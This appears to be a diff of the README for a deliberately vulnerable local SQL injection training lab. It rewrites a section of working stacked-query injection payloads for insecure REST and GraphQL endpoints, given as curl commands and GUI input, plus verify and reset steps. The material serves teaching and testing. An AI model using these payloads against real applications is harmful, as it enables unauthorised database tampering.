@@ -113,94 +113,69 @@ GraphiQL playground: `http://localhost:5001/graphql-insecure`
 
 ---
 
-## Demo Cheat Sheet — Copy-Paste Payloads
+## SQL Injection Exploit Examples
 
-All examples inject `INSERT INTO users(name,surname) VALUES('Alex','Injected')` as a verifiable side-effect.
+## Exploiting Anonymous Insecure REST Pages
+Note: Ensure that the cloth that you are adding is not assigned to user as duplicate key error will be returned
 
-### REST — Add Cloth (POST `/api/insecure-users/clothes`)
-
-clothid is integer context — close the `VALUES(...)` with `)` then stack.
-
-**curl**
-```bash
+Add Cloth exploit via Curl/Postman
+```
 curl -s -X POST http://localhost:5001/api/insecure-users/clothes \
   -H "Content-Type: application/json" \
   -d '{"userid":"5","clothid":"9); INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected'"'"'); --"}'
 ```
 
-**GUI field — Add Cloth**
+Add Cloth exploit via GUI
 ```
 9); INSERT INTO users(name,surname) VALUES('Alex','Injected'); --
 ```
 
-> Ensure cloth 9 is not already assigned to user 5 — duplicate key will abort the batch.
-
----
-
-### REST — Remove Cloth (POST `/api/insecure-users/remove-cloth`)
-
-clothid is integer context — stack directly with `;`.
-
-**curl**
-```bash
+Remove Cloth exploit via Curl/Postman
+```
 curl -s -X POST http://localhost:5001/api/insecure-users/remove-cloth \
   -H "Content-Type: application/json" \
   -d '{"userid":"1","clothid":"1; INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected'"'"'); --"}'
 ```
 
-**GUI field — Remove Cloth**
+Remove Cloth exploit via GUI
 ```
 1; INSERT INTO users(name,surname) VALUES('Alex','Injected'); --
 ```
 
----
+## Exploiting Insecure GraphQL Page
+Note: addInsecureCloth clothid is string context (wrapped in `'...'` in SQL) — the only string-context parameter in the app, break with `'`
 
-### GraphQL — Add Cloth (`addInsecureCloth`)
-
-clothid is **string context** — the only `'...'`-wrapped parameter in the app. Break with `'` first.
-
-**curl**
-```bash
+Add Cloth exploit via Curl/Postman
+```
 curl -s -X POST http://localhost:5001/graphql-insecure \
   -H "Content-Type: application/json" \
   -d '{"query":"mutation { addInsecureCloth(userid: 5, clothid: \"9'"'"'); INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected'"'"'); --\") }"}'
 ```
 
-**GUI field — Add Cloth**
+Add Cloth exploit via GUI
 ```
 9'); INSERT INTO users(name,surname) VALUES('Alex','Injected'); --
 ```
 
----
-
-### GraphQL — Remove Cloth (`removeInsecureCloth`)
-
-Both parameters are integer context — same pattern as REST remove.
-
-**curl**
-```bash
+Remove Cloth exploit via Curl/Postman
+```
 curl -s -X POST http://localhost:5001/graphql-insecure \
   -H "Content-Type: application/json" \
   -d '{"query":"mutation { removeInsecureCloth(userid: 1, clothid: \"1; INSERT INTO users(name,surname) VALUES('"'"'Alex'"'"','"'"'Injected'"'"'); --\") }"}'
 ```
 
-**GUI field — Remove Cloth**
+Remove Cloth exploit via GUI
 ```
 1; INSERT INTO users(name,surname) VALUES('Alex','Injected'); --
 ```
 
----
-
-### Verify + Reset
-
-```bash
-# Check injected rows appeared
+Verify
+```
 docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject \
   -c "SELECT * FROM users ORDER BY userid;"
-
-# Reset to clean seed data
-docker compose down -v && docker compose up -d
 ```
+
+Reset: `docker compose down -v && docker compose up -d`
 
 ---
 
